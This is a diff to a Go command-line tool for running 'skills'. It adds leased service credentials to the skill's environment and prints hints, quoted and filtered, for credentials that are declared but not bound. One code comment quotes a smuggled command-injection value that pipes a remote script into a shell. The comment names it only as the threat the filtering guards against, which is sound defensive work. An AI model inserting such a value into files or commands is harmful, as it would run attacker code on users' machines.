@@ -94,13 +94,69 @@ func parseRunArgs(args []string) (runOptions, string, []string, error) {
 	return opts, rest[0], command, nil
 }
 
+// runCredentials is what the resolved version's metadata said about service credentials.
+//
+// **Two answers from one read.** `Bound` decides whether this run asks for a lease at all — a
+// skill with nothing bound keeps the request count it had before v52. `Missing` is the author's
+// declaration minus what this caller would actually receive, and it is only ever printed: the run
+// goes ahead either way (v52 A6), because a skill that declares a variable it cannot get is a skill
+// whose own script will say so.
+type runCredentials struct {
+	Bound   bool
+	Missing []string
+}
+
+// missingCredentialsHint is the block `run` and `skill check` print when a declaration is unmet.
+//
+// **It names the user, not the agent.** The value can only be entered by the person who owns it —
+// the CLI refuses to read it from a terminal or an argument — so the sentence addresses whoever is
+// reading the output *on the user's behalf* and says not to paste it into the conversation. The
+// last line exists because "the run succeeded" would otherwise read as "the credential worked".
+func printMissingCredentials(address string, missing []string) {
+	// **A name that is not an environment variable name is never printed, and never inside a
+	// command.** These strings came from a skill's frontmatter — that is, from somebody else — and
+	// what follows is a command the *user* is asked to run. An author who declared
+	// `"A; curl evil.sh | sh"` would otherwise be writing the user's terminal. The server filters
+	// the same way; this side is the one that would do the damage.
+	valid := make([]string, 0, len(missing))
+	skipped := 0
+	for _, name := range missing {
+		if validSecretEnv(name) {
+			valid = append(valid, name)
+		} else {
+			skipped++
+		}
+	}
+	if len(valid) == 0 && skipped == 0 {
+		return
+	}
+	if len(valid) > 0 {
+		fmt.Fprintf(os.Stderr, "注意：这个 skill 声明了 %d 个服务凭据，你这里还没绑定：%s\n",
+			len(valid), strings.Join(valid, "、"))
+		fmt.Fprintln(os.Stderr, "      绑一次，以后在哪台机器上运行都会自动注入。请让用户自己执行（不要把值贴进对话）：")
+		for _, name := range valid {
+			// **The address is quoted too.** It comes from the caller's own command line rather
+			// than from the skill, so the risk is smaller than the variable name's — but this text
+			// is still a command somebody copies, and a typo with a shell metacharacter in it must
+			// not become a second command.
+			fmt.Fprintf(os.Stderr, "        printf '%%s' \"$值\" | skmr secret set --skill '%s' --env %s\n",
+				address, name)
+		}
+	}
+	if skipped > 0 {
+		// Said out loud, because silence would look like the declaration was empty.
+		fmt.Fprintf(os.Stderr, "      另有 %d 个声明不是合法的环境变量名，已忽略。\n", skipped)
+	}
+	fmt.Fprintln(os.Stderr, "      这次照常运行，脚本拿不到这些变量。")
+}
+
 func runSkill(ctx context.Context, args []string) error {
 	opts, address, command, err := parseRunArgs(args)
 	if err != nil {
 		return err
 	}
 
-	skillDir, digest, err := resolveVersion(ctx, address, opts)
+	skillDir, digest, credentials, err := resolveVersion(ctx, address, opts)
 	if err != nil {
 		return err
 	}
@@ -121,11 +177,28 @@ func runSkill(ctx context.Context, args []string) error {
 
 	if !opts.json {
 		fmt.Fprintf(os.Stderr, "执行 %s（sha256:%s，%s）\n", address, cacheKey(digest), workDir)
+		// **After the header, before the script** — the same place a person reads the version it
+		// resolved to. `--json` gets the same fact as a field instead of as prose.
+		printMissingCredentials(bareAddress(address), credentials.Missing)
 	}
 
 	cmd := exec.CommandContext(ctx, resolved[0], resolved[1:]...)
 	cmd.Dir = workDir
 	cmd.Env = append(os.Environ(), "SKILLMASTER_SKILL_DIR="+skillDir)
+	// **The value is put in the child's environment and nowhere else** — not on its command line,
+	// not in this process's own environment, not in the header line above (v52 / ADR 0168). Appending
+	// after `os.Environ()` is what makes the injected name win over a local one with the same name:
+	// `exec.Cmd` keeps the last entry for a duplicate key.
+	if credentials.Bound {
+		pairs, err := leaseCredentials(ctx, bareAddress(address))
+		if err != nil {
+			// **A skill that says it has credentials and cannot get them fails here**, rather than
+			// starting a script that will fail later for a reason nobody can see. `bound` comes from
+			// the server, so this branch is never taken for a skill without bindings.
+			return fmt.Errorf("这个 skill 绑定了服务凭据，但没取到：%w", err)
+		}
+		cmd.Env = append(cmd.Env, pairs...)
+	}
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr
 	runErr := cmd.Run()
 
@@ -147,7 +220,13 @@ func runSkill(ctx context.Context, args []string) error {
 			Command  []string `json:"command"`
 			ExitCode int      `json:"exit_code"`
 			SkillDir string   `json:"skill_dir"`
-		}{address, "sha256:" + digest, resolved, code, skillDir})
+			// v52 P2: the declaration this run could not satisfy. Empty when nothing was declared
+			// or everything was bound — a script reading the result treats both the same way.
+			CredentialsMissing []string `json:"credentials_missing"`
+		}{address, "sha256:" + digest, resolved, code, skillDir,
+			// An empty array rather than `null`: the field is a list, and a script that iterates it
+			// should not have to treat "nothing missing" as a different type from "some missing".
+			append([]string{}, credentials.Missing...)})
 		if err != nil {
 			return err
 		}
@@ -168,21 +247,21 @@ func runSkill(ctx context.Context, args []string) error {
 // remembered so the next run can be answered offline. That remembered answer is what makes the
 // cache useful on a machine with no network — the cache is keyed by digest, and without a memory
 // there is no way to turn `dev/pdf-tools` into the digest it was last resolved to.
-func resolveVersion(ctx context.Context, address string, opts runOptions) (string, string, error) {
+func resolveVersion(ctx context.Context, address string, opts runOptions) (string, string, runCredentials, error) {
 	// A malformed address is a usage error, not a network one: without this the request path is
 	// built from the typo and the person is told the server is unreachable.
 	if err := checkAddressSyntax("run", address); err != nil {
-		return "", "", err
+		return "", "", runCredentials{}, err
 	}
 	_, named, err := versionInAddress(address)
 	if err != nil {
-		return "", "", err
+		return "", "", runCredentials{}, err
 	}
 	base := bareAddress(address)
 
-	digest, offlineNote, err := resolveDigest(ctx, base, address, named)
+	digest, offlineNote, credentials, err := resolveDigest(ctx, base, address, named)
 	if err != nil {
-		return "", "", err
+		return "", "", runCredentials{}, err
 	}
 	if offlineNote != "" {
 		// Always said, even under `--json`: the result line is for a program, and "this is not the
@@ -192,9 +271,9 @@ func resolveVersion(ctx context.Context, address string, opts runOptions) (strin
 
 	dir, err := materialize(ctx, base, digest, opts)
 	if err != nil {
-		return "", "", err
+		return "", "", runCredentials{}, err
 	}
-	return dir, digest, nil
+	return dir, digest, credentials, nil
 }
 
 // resolveDigest asks the server, and falls back to the digest this machine last resolved.
@@ -204,7 +283,13 @@ func resolveVersion(ctx context.Context, address string, opts runOptions) (strin
 // over one would be running something the server just said does not exist. The fallback is
 // announced on stderr, because "the version you ran is not the current one" is exactly the kind of
 // thing this project refuses to let happen silently.
-func resolveDigest(ctx context.Context, base, address string, named bool) (string, string, error) {
+// **The third answer is `credentials_bound`.** It is read from the same `Metadata` response that
+// names the version, so a skill without credentials costs exactly the requests it did before
+// (v52 验收 A11/A12): the CLI only asks for a lease when the server already said there is one to
+// get. Every path that answers without a server — a digest in the address, a remembered digest after
+// a failure to reach it — returns false, because a run that could not reach the server is not one
+// that can produce a lease either.
+func resolveDigest(ctx context.Context, base, address string, named bool) (string, string, runCredentials, error) {
 	var pin string
 	if named {
 		_, version, _ := strings.Cut(address, "@")
@@ -214,7 +299,7 @@ func resolveDigest(ctx context.Context, base, address string, named bool) (strin
 		if err != nil {
 			// A record that does not parse is not "no record": taking it as one would resolve to
 			// whatever is current, which is the silent substitution ADR 0035 exists to prevent.
-			return "", "", pinsUnreadable(err)
+			return "", "", runCredentials{}, pinsUnreadable(err)
 		}
 		if found {
 			pin = remembered.Suffix()
@@ -226,7 +311,7 @@ func resolveDigest(ctx context.Context, base, address string, named bool) (strin
 	// asking the credential store first would refuse that for a reason the run never needed.
 	if named {
 		if digest := strings.TrimPrefix(pin, "sha256:"); isDigest(digest) {
-			return digest, "", nil
+			return digest, "", runCredentials{}, nil
 		}
 	}
 
@@ -237,15 +322,15 @@ func resolveDigest(ctx context.Context, base, address string, named bool) (strin
 		// and using it is exactly the offline case.
 		if cached, found := rememberedDigest(base); found {
 			return cached, fmt.Sprintf(
-				"读不到凭据，用上次在这个地址上解析到的版本 sha256:%s 继续。", cacheKey(cached)), nil
+				"读不到凭据，用上次在这个地址上解析到的版本 sha256:%s 继续。", cacheKey(cached)), runCredentials{}, nil
 		}
-		return "", "", err
+		return "", "", runCredentials{}, err
 	}
 	meta, metaErr := client.Metadata(ctx, base, pin)
 	if metaErr == nil {
 		digest := strings.TrimPrefix(meta.Version.Digest, "sha256:")
 		if !isDigest(digest) {
-			return "", "", fmt.Errorf("服务端给出的版本摘要不是 sha256 十六进制串（%q），不能按版本缓存",
+			return "", "", runCredentials{}, fmt.Errorf("服务端给出的版本摘要不是 sha256 十六进制串（%q），不能按版本缓存",
 				meta.Version.Digest)
 		}
 		// Only the address's own answer is remembered. A named version is a question about that
@@ -254,7 +339,7 @@ func resolveDigest(ctx context.Context, base, address string, named bool) (strin
 		if !named {
 			rememberDigest(base, digest)
 		}
-		return digest, "", nil
+		return digest, "", runCredentials{Bound: meta.CredentialsBound, Missing: meta.CredentialsMissing}, nil
 	}
 
 	// **Only "no answer" may be overruled by the cache.** Everything else — 404, 401, 403, 410 —
@@ -263,22 +348,22 @@ func resolveDigest(ctx context.Context, base, address string, named bool) (strin
 	// status answer is a different type, which is why this asks about the transport and not about a
 	// list of statuses.
 	if !unreachable(metaErr) {
-		return "", "", metaErr
+		return "", "", runCredentials{}, metaErr
 	}
 	// A named version cannot be answered offline: the remembered digest is about the address, not
 	// about that version, and answering with it would run a version the caller did not name. A
 	// digest in the address already returned above — it needs no server at all.
 	if named {
-		return "", "", fmt.Errorf("连不上服务端，而 %s 需要一个版本名才能解析：这一步需要联网。"+
+		return "", "", runCredentials{}, fmt.Errorf("连不上服务端，而 %s 需要一个版本名才能解析：这一步需要联网。"+
 			"想离线跑，就把版本写成 sha256:… 摘要。%w", address, metaErr)
 	}
 	cached, found := rememberedDigest(base)
 	if !found {
-		return "", "", fmt.Errorf("连不上服务端，本机也没有记住 %s 上次的版本，所以这次没法开始：这一步需要联网。%w",
+		return "", "", runCredentials{}, fmt.Errorf("连不上服务端，本机也没有记住 %s 上次的版本，所以这次没法开始：这一步需要联网。%w",
 			base, metaErr)
 	}
 	return cached, fmt.Sprintf("连不上服务端，用上次在这个地址上解析到的版本 sha256:%s 继续。",
-		cacheKey(cached)), nil
+		cacheKey(cached)), runCredentials{}, nil
 }
 
 // materialize returns a directory holding the version, fetching it when the cache does not.
